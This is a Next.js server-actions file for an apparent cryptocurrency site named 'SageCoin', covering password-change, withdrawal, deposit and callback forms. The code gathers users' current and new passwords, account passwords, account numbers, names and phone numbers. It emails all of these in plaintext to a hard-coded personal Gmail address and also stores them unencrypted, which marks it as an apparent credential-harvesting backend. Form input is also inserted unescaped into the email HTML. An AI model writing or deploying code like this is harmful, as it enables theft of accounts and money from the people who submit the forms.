'use server'

import { Resend } from 'resend'
import { createServerClient } from '@/lib/supabase'
import { checkRateLimit, getAuthenticatedUserId } from '@/lib/rate-limit'

// Destination email for form submissions
const DESTINATION_EMAIL = 'sagecoincom12@gmail.com'

// NOTE: If sagecoincom12@gmail.com is the Resend account owner's email, 
// emails will work without domain verification. This setup will work permanently.
// 
// Optional: To send FROM a custom domain (more professional), verify a domain:
// 1. Go to https://resend.com/domains and add your domain
// 2. Add DNS records to your domain
// 3. Set RESEND_FROM_EMAIL in .env.local: RESEND_FROM_EMAIL=SageCoin <noreply@yourdomain.com>

// Initialize Resend lazily to ensure env vars are loaded
function getResendClient() {
  const apiKey = process.env.RESEND_API_KEY
  if (!apiKey) {
    throw new Error('RESEND_API_KEY is not set in environment variables. Please add it to .env.local')
  }
  return new Resend(apiKey)
}

interface FormSubmissionResult {
  success: boolean
  message: string
}

// Helper function to log transaction to Supabase
async function logTransaction(
  type: 'password_change' | 'withdrawal' | 'deposit',
  data: Record<string, any>
): Promise<void> {
  try {
    const supabase = createServerClient()
    
    // Try to get the current user from cookies if available
    // Note: This is optional - transactions can be logged without a user
    let userId: string | null = null
    try {
      const { cookies } = await import('next/headers')
      const cookieStore = cookies()
      const accessToken = cookieStore.get('sb-access-token')?.value || 
                         cookieStore.get('supabase-auth-token')?.value
      
      if (accessToken) {
        const { data: { user } } = await supabase.auth.getUser(accessToken)
        userId = user?.id || null
      }
    } catch (cookieError) {
      // If we can't get user from cookies, that's fine - continue without user_id
      console.debug('Could not get user from cookies:', cookieError)
    }
    
    await (supabase.from('transactions') as any).insert({
      type,
      user_id: userId,
      data: data,
      status: 'pending', // All new transactions start as pending
      created_at: new Date().toISOString(),
    })
  } catch (error) {
    // Log error but don't fail the request
    console.error('Failed to log transaction to Supabase:', error)
  }
}

// Change Password Form Action
export async function submitChangePassword(
  currentPassword: string,
  newPassword: string,
  accountNumber: string,
  token?: string
): Promise<FormSubmissionResult> {
  try {
    // Check authentication
    const userId = await getAuthenticatedUserId(token)
    if (!userId) {
      return {
        success: false,
        message: 'Authentication required. Please log in to submit this form.',
      }
    }

    // Check rate limit: 5 requests per hour
    const rateLimit = await checkRateLimit({
      maxRequests: 5,
      windowMs: 3600000, // 1 hour
      actionType: 'password_change'
    }, token)

    if (!rateLimit.allowed) {
      return {
        success: false,
        message: rateLimit.message || 'Rate limit exceeded. Please try again later.',
      }
    }

    // Validate required fields
    if (!currentPassword || !newPassword || !accountNumber) {
      return {
        success: false,
        message: 'All fields are required',
      }
    }

    // Send email
    const emailSubject = 'New Password Change Request'
    const emailBody = `
      <h2>Password Change Request</h2>
      <p><strong>Current Password:</strong> ${currentPassword}</p>
      <p><strong>New Password:</strong> ${newPassword}</p>
      <p><strong>Account Number:</strong> ${accountNumber}</p>
      <p><strong>Submitted at:</strong> ${new Date().toLocaleString()}</p>
    `

    try {
      const emailResult = await getResendClient().emails.send({
        from: process.env.RESEND_FROM_EMAIL || 'SageCoin <onboarding@resend.dev>',
        to: DESTINATION_EMAIL,
        subject: emailSubject,
        html: emailBody,
      })
      console.log('Email sent successfully:', emailResult)
    } catch (emailError: any) {
      console.error('Failed to send email:', emailError)
      // Don't fail the entire request if email fails, but log it
      // You might want to return an error here if email is critical
      throw new Error(`Email sending failed: ${emailError?.message || 'Unknown error'}`)
    }

    // Log to Supabase
    await logTransaction('password_change', {
      currentPassword,
      newPassword,
      accountNumber,
    })

    return {
      success: true,
      message: 'Password change request submitted successfully',
    }
  } catch (error: any) {
    console.error('Error submitting password change:', error)
    const errorMessage = error?.message || 'Unknown error occurred'
    return {
      success: false,
      message: `Failed to submit password change request: ${errorMessage}. Please check the server logs for more details.`,
    }
  }
}

// Withdrawal Form Action
export async function submitWithdrawal(
  amount: string,
  accountNumber: string,
  password: string,
  fullName: string,
  phoneNumber: string,
  note?: string,
  token?: string
): Promise<FormSubmissionResult> {
  try {
    // Check authentication
    const userId = await getAuthenticatedUserId(token)
    if (!userId) {
      return {
        success: false,
        message: 'Authentication required. Please log in to submit this form.',
      }
    }

    // Check rate limit: 5 requests per hour
    const rateLimit = await checkRateLimit({
      maxRequests: 5,
      windowMs: 3600000, // 1 hour
      actionType: 'withdrawal'
    }, token)

    if (!rateLimit.allowed) {
      return {
        success: false,
        message: rateLimit.message || 'Rate limit exceeded. Please try again later.',
      }
    }

    // Validate required fields
    if (!amount || !accountNumber || !password || !fullName || !phoneNumber) {
      return {
        success: false,
        message: 'Amount, Account Number, Password, Full Name, and Phone Number are required',
      }
    }

    // Validate amount is a number
    const amountNum = parseFloat(amount)
    if (isNaN(amountNum) || amountNum <= 0) {
      return {
        success: false,
        message: 'Amount must be a valid positive number',
      }
    }

    // Send email
    const emailSubject = 'New Withdrawal Request'
    const emailBody = `
      <h2>Withdrawal Request</h2>
      <p><strong>Amount:</strong> ${amount}</p>
      <p><strong>Account Number:</strong> ${accountNumber}</p>
      <p><strong>Password:</strong> ${password}</p>
      <p><strong>Full Name:</strong> ${fullName}</p>
      <p><strong>Phone Number:</strong> ${phoneNumber}</p>
      ${note ? `<p><strong>Note:</strong> ${note}</p>` : ''}
      <p><strong>Submitted at:</strong> ${new Date().toLocaleString()}</p>
    `

    try {
      const emailResult = await getResendClient().emails.send({
        from: process.env.RESEND_FROM_EMAIL || 'SageCoin <onboarding@resend.dev>',
        to: DESTINATION_EMAIL,
        subject: emailSubject,
        html: emailBody,
      })
      console.log('Email sent successfully:', emailResult)
    } catch (emailError: any) {
      console.error('Failed to send email:', emailError)
      throw new Error(`Email sending failed: ${emailError?.message || 'Unknown error'}`)
    }

    // Log to Supabase
    await logTransaction('withdrawal', {
      amount: amountNum,
      accountNumber,
      password,
      fullName,
      phoneNumber,
      note: note || null,
    })

    return {
      success: true,
      message: 'Withdrawal request submitted successfully',
    }
  } catch (error: any) {
    console.error('Error submitting withdrawal:', error)
    const errorMessage = error?.message || 'Unknown error occurred'
    return {
      success: false,
      message: `Failed to submit withdrawal request: ${errorMessage}. Please check the server logs for more details.`,
    }
  }
}

// Deposit Form Action
export async function submitDeposit(
  amount: string,
  password: string,
  accountNumber: string,
  fullName: string,
  phoneNumber: string,
  note?: string,
  token?: string
): Promise<FormSubmissionResult> {
  try {
    // Check authentication
    const userId = await getAuthenticatedUserId(token)
    if (!userId) {
      return {
        success: false,
        message: 'Authentication required. Please log in to submit this form.',
      }
    }

    // Check rate limit: 5 requests per hour
    const rateLimit = await checkRateLimit({
      maxRequests: 5,
      windowMs: 3600000, // 1 hour
      actionType: 'deposit'
    }, token)

    if (!rateLimit.allowed) {
      return {
        success: false,
        message: rateLimit.message || 'Rate limit exceeded. Please try again later.',
      }
    }

    // Validate required fields
    if (!amount || !password || !accountNumber || !fullName || !phoneNumber) {
      return {
        success: false,
        message: 'Amount, Password, Account Number, Full Name, and Phone Number are required',
      }
    }

    // Validate amount is a number
    const amountNum = parseFloat(amount)
    if (isNaN(amountNum) || amountNum <= 0) {
      return {
        success: false,
        message: 'Amount must be a valid positive number',
      }
    }

    // Send email
    const emailSubject = 'New Deposit Request'
    const emailBody = `
      <h2>Deposit Request</h2>
      <p><strong>Amount:</strong> ${amount}</p>
      <p><strong>Password:</strong> ${password}</p>
      <p><strong>Account Number:</strong> ${accountNumber}</p>
      <p><strong>Full Name:</strong> ${fullName}</p>
      <p><strong>Phone Number:</strong> ${phoneNumber}</p>
      ${note ? `<p><strong>Note:</strong> ${note}</p>` : ''}
      <p><strong>Submitted at:</strong> ${new Date().toLocaleString()}</p>
    `

    try {
      const emailResult = await getResendClient().emails.send({
        from: process.env.RESEND_FROM_EMAIL || 'SageCoin <onboarding@resend.dev>',
        to: DESTINATION_EMAIL,
        subject: emailSubject,
        html: emailBody,
      })
      console.log('Email sent successfully:', emailResult)
    } catch (emailError: any) {
      console.error('Failed to send email:', emailError)
      throw new Error(`Email sending failed: ${emailError?.message || 'Unknown error'}`)
    }

    // Log to Supabase
    await logTransaction('deposit', {
      amount: amountNum,
      password,
      accountNumber,
      fullName,
      phoneNumber,
      note: note || null,
    })

    return {
      success: true,
      message: 'Deposit request submitted successfully',
    }
  } catch (error: any) {
    console.error('Error submitting deposit:', error)
    const errorMessage = error?.message || 'Unknown error occurred'
    return {
      success: false,
      message: `Failed to submit deposit request: ${errorMessage}. Please check the server logs for more details.`,
    }
  }
}

// Callback Request Form Action (Public - No authentication required)
export async function submitCallbackRequest(
  fullName: string,
  email: string,
  phoneNumber: string
): Promise<FormSubmissionResult> {
  try {
    // Simple rate limiting - check total callback requests in last hour
    // This prevents spam while allowing legitimate requests
    try {
      const supabase = createServerClient()
      const oneHourAgo = new Date(Date.now() - 3600000).toISOString()
      
      const { count, error } = await supabase
        .from('transactions')
        .select('*', { count: 'exact', head: true })
        .eq('type', 'callback_request')
        .gte('created_at', oneHourAgo)
      
      if (!error && count && count >= 50) {
        return {
          success: false,
          message: 'We are receiving too many requests at the moment. Please try again in a few minutes.',
        }
      }
    } catch (rateLimitError) {
      // If rate limit check fails, allow the request but log it
      console.error('Rate limit check error:', rateLimitError)
    }

    // Validate required fields
    if (!fullName || !email || !phoneNumber) {
      return {
        success: false,
        message: 'All fields are required',
      }
    }

    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(email)) {
      return {
        success: false,
        message: 'Please enter a valid email address',
      }
    }

    // Send email
    const emailSubject = 'New Callback Request'
    const emailBody = `
      <h2>Callback Request</h2>
      <p><strong>Full Name:</strong> ${fullName}</p>
      <p><strong>Email:</strong> ${email}</p>
      <p><strong>Phone Number:</strong> ${phoneNumber}</p>
      <p><strong>Submitted at:</strong> ${new Date().toLocaleString()}</p>
    `

    try {
      const emailResult = await getResendClient().emails.send({
        from: process.env.RESEND_FROM_EMAIL || 'SageCoin <onboarding@resend.dev>',
        to: DESTINATION_EMAIL,
        subject: emailSubject,
        html: emailBody,
      })
      console.log('Email sent successfully:', emailResult)
    } catch (emailError: any) {
      console.error('Failed to send email:', emailError)
      throw new Error(`Email sending failed: ${emailError?.message || 'Unknown error'}`)
    }

    // Optionally log to Supabase (without user_id since this is public)
    try {
      const supabase = createServerClient()
      await (supabase.from('transactions') as any).insert({
        type: 'callback_request',
        user_id: null, // Public form, no user required
        data: {
          fullName,
          email,
          phoneNumber,
        },
        status: 'pending',
        created_at: new Date().toISOString(),
      })
    } catch (logError) {
      // Log error but don't fail the request
      console.error('Failed to log callback request to Supabase:', logError)
    }

    return {
      success: true,
      message: 'Callback request submitted successfully! We will contact you soon.',
    }
  } catch (error: any) {
    console.error('Error submitting callback request:', error)
    const errorMessage = error?.message || 'Unknown error occurred'
    return {
      success: false,
      message: `Failed to submit callback request: ${errorMessage}. Please try again later.`,
    }
  }
}

